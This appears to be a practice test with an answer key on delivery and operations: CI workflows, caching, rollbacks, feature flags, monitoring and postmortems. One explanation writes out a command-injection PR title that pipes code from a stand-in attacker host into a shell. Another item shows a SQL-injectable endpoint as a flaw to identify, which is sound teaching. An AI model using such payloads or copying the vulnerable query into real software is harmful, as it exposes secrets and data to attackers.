# Delivery and Operations: Practice test

### 1. Why should a CI job install dependencies with `npm ci` rather than `npm install`?

- [ ] `npm ci` skips dev dependencies, so the install is smaller
- [x] `npm ci` installs exactly what the lockfile specifies and fails if `package.json` and the lockfile disagree, so every run is reproducible
- [ ] `npm ci` is the only command that can use a cache
- [ ] `npm install` cannot run on Linux runners

> `npm ci` removes any existing `node_modules`, installs precisely the versions in `package-lock.json`, and errors if the lockfile is out of sync, instead of quietly updating it. That makes CI test the same dependency tree developers committed. It does install dev dependencies (you need them to lint, test, and build), and both commands can use the npm cache.

### 2. A team's PR checks go red, but people merge anyway and `main` breaks regularly. The workflow file is correct. What is missing?

- [ ] A `timeout-minutes` setting on the job
- [ ] A `concurrency` group to cancel old runs
- [x] A ruleset or branch protection rule that marks the checks as required before merging
- [ ] A cache for `node_modules`

> A workflow only reports a status. Unless the repository requires that status to pass before merge (and ideally requires the branch to be up to date, or uses a merge queue), a failing check is advisory. Timeouts, concurrency, and caching affect cost and speed, not enforcement.

### 3. What does this `concurrency` block do?

```yaml
on:
  pull_request:
  push:
    branches: [main]

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

- [ ] It limits the workflow to one run at a time across the whole repository
- [ ] It runs the jobs of the workflow one after another instead of in parallel
- [ ] It cancels runs on `main` when a pull request is opened
- [x] For each ref, a new run replaces a queued or running one; on pull requests the older run is cancelled, while runs on `main` are left to finish

> The group key includes the ref, so each PR and `main` have their own group. With `cancel-in-progress` true for pull requests, pushing a new commit to a PR cancels the superseded run and saves minutes. On pushes to `main` the expression is false, so an in-progress run is not cancelled (a newer one waits), which is what you want for anything that deploys.

### 4. A workflow restores a Next.js build cache with the key below. Builds are fast, but occasionally the deployed site shows output from an older commit's code. What is wrong?

```yaml
- uses: actions/cache@v6
  with:
    path: .next
    key: next-build-${{ runner.os }}
```

- [x] The key never changes and the whole `.next` output is cached, so stale build output can be restored and reused; cache only `.next/cache` and key it on the lockfile and source
- [ ] `actions/cache` cannot store directories that start with a dot
- [ ] The cache is restored after the build step, so it has no effect
- [ ] `runner.os` is not available in cache keys

> A cache key should change whenever the cached content should change. A constant key means the first cache ever saved is restored forever, and caching the entire build output (not just the incremental cache directory) invites stale artefacts. Key on `hashFiles` of the lockfile and sources, add `restore-keys` for partial matches, and cache `.next/cache`, letting the build regenerate real output.

### 5. This workflow comments on pull requests, including those from forks. What is the vulnerability?

```yaml
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Checking PR: ${{ github.event.pull_request.title }}"
          gh pr comment "$PR" --body "Thanks!"
        env:
          PR: ${{ github.event.pull_request.number }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

- [ ] `gh` is not installed on GitHub-hosted runners
- [ ] `env` values cannot contain expressions
- [x] The PR title is interpolated into the shell script before it runs, so a crafted title executes commands in a job that has a privileged token
- [ ] `pull_request_target` workflows cannot access `secrets.GITHUB_TOKEN`

> `${{ }}` expressions are substituted into the script text before the shell sees it. A title such as `"; curl https://evil.example/x | sh; "` becomes part of the command. Because `pull_request_target` runs in the context of the base repository with access to secrets, this is exploitable by anyone who can open a PR. Pass untrusted values through `env` (as is done for `PR`) and reference them as shell variables, and give the job the minimum `permissions`.

### 6. Why is deploying to a cloud provider with OIDC safer than storing an access key as a repository secret, and what two other pipeline controls limit the damage of a compromised third-party action?

> A stored access key is long-lived: it works from any machine until it is rotated, so if it leaks through logs, a malicious dependency, or a compromised action, the attacker has standing access. With OIDC the job asks GitHub for a short-lived signed token that states which repository, branch, and environment it is running for; the cloud provider validates those claims against a trust policy and issues credentials that expire with the job. Nothing long-lived is stored, there is nothing to rotate, and the trust policy can restrict access to, say, only the `production` environment on `main`. Two further controls: pin third-party actions to a full commit SHA, because tags can be moved to malicious code while a SHA is immutable; and apply least privilege, with `permissions` set to none by default and granted per job, plus deploy secrets held in a protected environment that requires approval and restricts branches. Requiring code-owner review for workflow files is another good answer.

### 7. Explain the difference between continuous delivery and continuous deployment, and list four things that must be true before you would deploy every merge to production automatically.

> Continuous delivery means every change that passes the pipeline is in a deployable state and releasing is a routine, push-button decision made by a person. Continuous deployment removes that manual step: every change that passes goes to production automatically. Prerequisites for the latter include: `main` is protected by required checks (and a merge queue at volume) so it stays green; automated tests cover the critical user flows; deploys are immutable and atomic, with protection against version skew, and database or API changes are backward compatible; monitoring is tagged by release and alerts on user-facing symptoms within minutes; rollback is fast and practised; and unfinished work is hidden behind feature flags rather than long-lived branches. A good answer notes that small, frequent deploys reduce risk per deploy because each change is small and easy to isolate.

### 8. Which statement about canary releases for a frontend is correct?

- [ ] A canary is a second production environment that receives all traffic once it has been verified
- [ ] Canary users can be reassigned between versions on every request without problems
- [x] A small share of real users gets the new version, its metrics are compared with the baseline by release, and each user must stay on one version so their asset requests match their HTML
- [ ] A canary removes the need for monitoring, because only a few users are affected

> A canary exposes a fraction of real traffic to the new version and decides to widen or abort based on comparing error rates and performance against the current version, which requires tagging telemetry by release. Users must be sticky to a version, or HTML from one build will request chunks from another. Switching all traffic to a verified second environment describes blue-green.

### 9. Production breaks five minutes after a deploy. In what order should you act, and why?

- [ ] Find the root cause, write a fix, deploy it, then tell stakeholders
- [ ] Tell stakeholders, wait to see whether errors continue, then investigate
- [ ] Revert the commit, wait for CI and the build, then investigate
- [x] Roll back to the previous deployment or disable the flag, confirm recovery, communicate, then find and fix the cause and revert the commit on `main`

> Mitigate first: repointing to the last good deployment or turning off a flag takes about a minute and is known to work, while a forward fix is untested code written under pressure. A git revert that goes through the pipeline is slower, so do it after the instant rollback to stop the bug being redeployed. Investigation happens once users are no longer affected.

### 10. Name four things that a deployment rollback does not undo, and one technique that keeps rollbacks safe when the database schema changes.

> A rollback restores the previous code. It does not undo: data written or migrated in the new format (or columns dropped by a migration); environment variable, DNS, feature-flag, or third-party configuration changes; state on clients, such as tabs already running the bad JavaScript, service worker caches, and CDN-cached HTML; and side effects already performed, such as emails sent or payments taken. To keep rollbacks safe across schema changes, use expand, migrate, contract (parallel change): first add the new column or table without removing the old one, deploy code that works with both, migrate the data, and only remove the old structure in a later release once nothing depends on it. At every step the previous version of the code can still run against the database.

### 11. A release contains this migration and the code that reads `full_name`. It is deployed with a rolling update, then rolled back ten minutes later because of an unrelated bug. What goes wrong?

```sql
ALTER TABLE users RENAME COLUMN name TO full_name;
```

- [ ] Nothing; a rename is metadata-only, so it is always safe
- [ ] The rollback automatically reverses the migration
- [ ] Only the rollback fails; the rolling deploy itself is safe
- [x] Old instances fail as soon as the migration runs because `name` is gone, and after the rollback the old code again runs against a schema without `name`

> During a rolling deploy old and new code share one database, and a rollback restores code, not schema. A rename breaks every version that uses the old name. The safe sequence is expand, migrate, contract: add `full_name`, deploy code that writes both, backfill, switch reads, stop writing `name`, and drop it in a later release once no running or rollback-target version needs it.

### 12. A server-rendered page shows the new checkout for a moment and then flips to the old one, and React logs a hydration mismatch. The flag `newCheckout` is at a 50% rollout. Explain the cause and the fix, and name two things that must happen before this flag can be called finished.

> The flag is being evaluated twice with different results: once on the server during rendering and again in the browser, probably with a different targeting key (for example, a random or missing ID on one side) or before the client SDK has loaded its configuration. The HTML and the client render disagree, so hydration fails and the UI flips. Fix: evaluate once per request on the server using a stable targeting key (user ID or an anonymous ID stored in a cookie), embed the evaluated values in the HTML payload, and have the client use those bootstrapped values instead of re-evaluating; percentage rollouts must hash that stable key so the user stays in one bucket. If the page is CDN-cached, the variant must be part of the cache key. The API behind the new checkout must check the same flag. The flag is finished only when it is at 100% (or abandoned), the losing code path and its tests are deleted, and the flag is archived in the flag service; it should have had an owner and expiry date from creation so this cleanup is tracked.

### 13. What do these two response headers mean together, and for which kind of file is each appropriate?

```http
Cache-Control: no-cache
```

```http
Cache-Control: public, max-age=31536000, immutable
```

- [ ] The first forbids storing the response anywhere; the second caches for one hour
- [ ] The first is for hashed assets; the second is for HTML documents
- [ ] Both are equivalent, because `immutable` overrides `max-age`
- [x] The first allows storing but requires revalidation before each use, which suits HTML; the second lets any cache reuse the response for a year without checking, which suits fingerprinted assets

> `no-cache` does not mean "do not store" (that is `no-store`); it means the cached copy must be revalidated with the origin before it is used, so users get new HTML promptly after a deploy. Files whose names contain a content hash never change at that URL, so they can be cached for a year and marked `immutable`. Swapping the two would freeze users on old HTML.

### 14. After a deploy, users with a tab open from before the deploy report that clicking "Settings" shows a blank screen. The console shows the error below. What happened, and what are two defences?

```text
Uncaught SyntaxError: Unexpected token '<'  (at settings.a1b2c3.js:1:1)
```

> This is version skew. The old tab's JavaScript tried to lazy-load the chunk `settings.a1b2c3.js` from the previous build. The new deploy removed that file, and the host's SPA fallback answered the request with `index.html` and status 200, so the browser tried to parse HTML as JavaScript and failed at the first `<`. Defences: keep previous builds' hashed assets available after a deploy instead of deleting them; make missing assets return a real 404 rather than the HTML fallback; pin each client's requests to the deployment that served its page (platform skew protection or a deployment ID); catch dynamic import failures (for example Vite's `vite:preloadError` event) and reload once, with a guard against reload loops; serve HTML with `no-cache` so new loads get the current version; and prompt long-lived sessions to refresh when a new version is detected.

### 15. This Dockerfile works but has several problems. Which change gives the largest improvement to rebuild time?

```dockerfile
FROM node:24
WORKDIR /app
COPY . .
RUN npm install
RUN npm run build
CMD npm start
```

- [ ] Replace `WORKDIR /app` with `RUN cd /app`
- [x] Copy `package.json` and `package-lock.json` and run `npm ci` before copying the rest of the source, so the install layer is reused when only source files change
- [ ] Combine all `RUN` lines into one to reduce the number of layers
- [ ] Add `EXPOSE 3000`

> Docker caches each layer and invalidates everything after the first changed instruction. With `COPY . .` before the install, any source edit reruns the full dependency installation. Copying only the manifest and lockfile first keeps the install layer cached until dependencies change. Other problems worth fixing: no multi-stage build (the image ships dev dependencies and build tools), running as root, `npm install` instead of `npm ci`, and shell-form `CMD npm start`, which stops `SIGTERM` reaching Node.

### 16. A function deployed to an edge runtime based on V8 isolates fails at startup with an error about a missing module, although the same code runs locally in Node.js. What is the most likely reason?

- [ ] Edge runtimes do not support `async` functions
- [ ] Edge functions cannot make outbound `fetch` requests
- [x] A dependency relies on a Node.js built-in or native module that the edge runtime does not provide
- [ ] Edge runtimes only run code written in WebAssembly

> Isolate-based edge runtimes provide web-standard APIs (`fetch`, streams, Web Crypto) and only a subset of Node.js, sometimes behind a compatibility flag. Packages that need native addons or unsupported built-ins will not load. They do support `async` code and `fetch`, and they run JavaScript directly. This runtime difference, along with CPU and memory limits, is the price for near-zero cold starts.

### 17. Your site moved hosting yesterday, and some users still reach the old server. A colleague says "DNS is still propagating". What is actually happening, and what should have been done beforehand?

- [ ] DNS changes are pushed to every resolver, and the push takes 48 hours
- [ ] Browsers ignore DNS changes until they are restarted
- [ ] The old server must be turned off before resolvers update
- [x] Resolvers cached the old record for its TTL; lowering the TTL well before the change would have made the old answer expire quickly

> Nothing propagates outward. Resolvers and clients cache each DNS answer for the record's time to live and ask again when it expires. If the record had a TTL of a day, the old address is served from caches for up to a day after the change. Lower the TTL at least one old-TTL period before the migration, make the change, then raise it again. Keep the old server running until the caches have expired.

### 18. Stack traces in your error tracker look like `at t (app.8f3a.js:1:48213)`. What is missing, and how do you fix it without exposing your source code publicly?

- [ ] The tracker needs a higher sample rate; minified traces mean events were dropped
- [x] Source maps were not uploaded for that release; generate hidden source maps, upload them to the tracker during the build, and remove them from the deployed files
- [ ] The app must be deployed unminified so that traces are readable
- [ ] The browser must have DevTools open for traces to be symbolicated

> The tracker needs the source map for the exact build to translate minified positions back to original files and lines. Generate maps without a `sourceMappingURL` comment (for example Vite's `build.sourcemap: 'hidden'`), upload them in CI tied to the release, and delete the `.map` files from the output so they are not served. Shipping unminified code is unnecessary and costly.

### 19. A RUM dashboard shows mean LCP of 1.9 s, yet support keeps hearing that the product page is slow on phones. What is wrong with how the data is being read, and what would you look at instead?

> A mean hides the distribution: many fast desktop loads can average out a large group of slow mobile loads, and a mean says nothing about how many users have a poor experience. Core Web Vitals are assessed at the 75th percentile, so look at p75 (and p90 or p95 for the tail), and at the proportion of page views rated good, needs improvement, and poor. Then segment: by route pattern (the product page specifically), device class, connection type, country, and release. The complaint predicts that p75 LCP for the product route on mobile is well above 2.5 s. From there use attribution data (which element is the LCP, and how its time splits into TTFB, load delay, load time, and render delay) to find the cause, and compare releases to see whether it is a regression.

### 20. The browser calls `https://api.example.com` from `https://app.example.com` with tracing enabled, and API requests start failing at the preflight. What needs to change?

```http
OPTIONS /orders HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, traceparent

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Headers: content-type
```

- [ ] The browser must send `traceparent` as a cookie instead of a header
- [ ] The API must respond with status 200 instead of 204
- [x] The API must include `traceparent` in `Access-Control-Allow-Headers`, since it is a non-safelisted request header
- [ ] The frontend must switch from `fetch` to `XMLHttpRequest`

> Adding `traceparent` to a cross-origin request triggers a preflight, and the browser sends the real request only if the server lists every requested header in `Access-Control-Allow-Headers`. The response allows only `content-type`, so the preflight fails. Add `traceparent` (and `tracestate` or any vendor header) on the server, and limit header propagation in the SDK to your own API origins.

### 21. Which alert is the best candidate to page someone at night?

- [ ] CPU usage on one server exceeded 80% for one minute
- [ ] A single request to `/api/recommendations` returned 500
- [ ] The number of JavaScript errors today is higher than yesterday
- [x] The checkout flow's synthetic check has failed from two regions for five minutes and the checkout error rate is above 5%

> Page on symptoms users feel that are urgent and actionable. A failing critical journey confirmed from two locations, with a sustained error rate, meets that bar. High CPU is a cause that may have no user impact; one failed request is noise; a raw daily count scales with traffic and is neither urgent nor specific. Those belong on dashboards or in tickets.

### 22. An availability SLO is "99.9% of checkout attempts succeed over 30 days", and the checkout receives 2,000,000 attempts in that window. How many failed attempts does the error budget allow, and what should the team do when the budget is used up with ten days left?

- [ ] 200 failures; nothing changes until the window resets
- [x] 2,000 failures; the team shifts priority from feature work to reliability until the service is back within its objective
- [ ] 20,000 failures; the team should raise the target to 99.99%
- [ ] 2,000 failures; the team should lower the target so the budget is no longer exceeded

> The budget is the allowed unreliability: 0.1% of 2,000,000 is 2,000 failed attempts. The purpose of an error budget is to drive decisions. While budget remains, the team can ship at full speed; when it is exhausted, risky releases slow down and effort goes into reliability. Changing the target to hide a breach defeats the point, though a target that is consistently wrong should be revisited deliberately.

### 23. Rewrite this postmortem finding so that it is blameless and leads to an action item that prevents recurrence: "Root cause: Priya forgot to add the new environment variable to production before deploying."

> A blameless version describes how the system allowed the mistake: "The release required a new environment variable, `PAYMENTS_API_URL`. It was added to preview but not to production. Nothing in the pipeline checks that required configuration exists, the app does not validate its configuration at startup, and the missing value surfaced only as failed checkout requests, which took 14 minutes to detect because there is no alert on checkout error rate." Action items that prevent or detect it mechanically: validate configuration against a schema at build and at startup, failing the deploy if a required variable is missing; add a post-deploy smoke test for checkout; add an alert on checkout error rate with a runbook; add a PR template line for configuration changes. "Be more careful" or "remind engineers" is not an acceptable action, because it changes nothing about the system.

### 24. This endpoint is used by a search page. What is the most serious problem?

```js
app.get('/products', (c) => {
  const q = c.req.query('q') ?? '';
  const rows = db.prepare(`SELECT id, name FROM products WHERE name LIKE '%${q}%'`).all();
  return c.json(rows);
});
```

- [ ] It should use `POST`, because `GET` requests cannot have query strings
- [ ] `c.json` must be awaited
- [x] User input is concatenated into the SQL string, which allows SQL injection; use a parameterised query and validate the input
- [ ] `SELECT id, name` should be `SELECT *` so the client has all the data

> Building SQL from user input lets a caller change the query itself, for example to read other tables. Pass values as parameters (`... WHERE name LIKE ?` with `%${q}%` as the bound value) so they are never interpreted as SQL, and validate length and type at the boundary. Secondary problems: no `LIMIT` or pagination, and a leading-wildcard `LIKE` cannot use an ordinary index, so it scans the table.

### 25. An "Orders" page loads 50 orders and takes four seconds. The server log for one request shows the queries below. What is the problem called, and how is it fixed?

```sql
SELECT id, customer_id, total FROM orders ORDER BY created_at DESC LIMIT 50;
SELECT id, name FROM customers WHERE id = 17;
SELECT id, name FROM customers WHERE id = 42;
SELECT id, name FROM customers WHERE id = 8;
-- ... 47 more
```

- [ ] A missing index on `orders.created_at`; add one and the 51 queries become fast
- [ ] Connection pooling; open a new connection for each query
- [ ] Over-fetching; select fewer columns from `orders`
- [x] The N+1 query problem; load the customers in one query with a `JOIN` or a single `WHERE id IN (...)`, so the page needs one or two queries

> One query fetches the list and then one more runs per row, so cost grows with page size and each query adds a network round trip. Fetch the related rows together: `SELECT o.id, o.total, c.name FROM orders o JOIN customers c ON c.id = o.customer_id ...`, or a second query with all IDs. An index on `created_at` helps the first query but does not remove the 50 extra round trips. ORMs produce this pattern easily through lazy-loaded relations.

### 26. A user updates their display name, the API returns 200, but the profile page still shows the old name for about a minute. The response headers for `GET /api/profile` are below. Explain what is happening and how you would fix it.

```http
HTTP/2 200
cache-control: public, s-maxage=60
age: 41
```

> The profile response is being stored in a shared cache (the CDN) for 60 seconds: `public, s-maxage=60` permits it, and `age: 41` shows this copy came from the cache and is 41 seconds old. After the update, reads keep returning the cached copy until it expires. This is also a serious correctness and privacy problem: a personalised response marked `public` can be served to a different user if the cache key does not include their identity. Fix: personalised endpoints should be `Cache-Control: private, no-store` (or at most `private` with revalidation), so no shared cache stores them. For data that genuinely can be shared and cached, purge by URL or tag on write and update or invalidate the client-side cache from the mutation response so the user reads their own write immediately. To diagnose issues like this, check `Age` and the CDN's cache status header and bypass layers one at a time.

### 27. The server responds to "Export all orders" as shown. What should the client do?

```http
HTTP/1.1 202 Accepted
Location: /exports/8f3a

{ "id": "8f3a", "status": "queued" }
```

- [x] Treat the export as started, not finished: show a pending state, then poll `/exports/8f3a` (or subscribe to updates) until it reports success or failure, and survive a page reload
- [ ] Treat it as an error, because only 200 means success
- [ ] Retry the `POST` every second until the server returns 200
- [ ] Show "Export complete" and download from the `Location` URL immediately

> `202 Accepted` means the server has taken the job but not completed it; the work happens in a background worker. The client needs a state machine (queued, running, succeeded, failed), a way to learn the outcome (polling the status resource with backoff, SSE, or a notification), and the job must be findable after a reload. Re-sending the `POST` would enqueue duplicate jobs unless the request carries an idempotency key.

### 28. You are planning a game day for a single-page app hosted on a CDN platform with error tracking and RUM. Describe one scenario, what you would measure, and what kinds of findings you expect.

> Scenario: deploy a build, to a staging project or behind a flag for test users, that throws an error when the "Place order" button is clicked. Hypothesis: the error-rate alert fires within five minutes and the on-call engineer can roll back in under two. Roles: a facilitator who injects the fault, a responder who does not know the scenario and uses only the real tools and runbook, and a note-taker. Measure with timestamps: time to detect (and whether an alert or a person detected it), time to identify the release and cause, time to mitigate (rollback or flag off), and time to verify recovery. Typical findings: the alert threshold was too high or routed to a channel nobody watches; source maps were missing, so the stack trace was unreadable; dashboards lacked deploy markers; the runbook's rollback command was outdated or the responder lacked permission; the old tab kept running the broken code after rollback. Afterwards hold a blameless review, turn each gap into an owned action item, and rerun the scenario to confirm the fixes. Other valid scenarios: an API returning 500s or responding slowly, a blocked third-party script, version skew during a deploy, a missing environment variable, or a wrong cache header that needs purging.
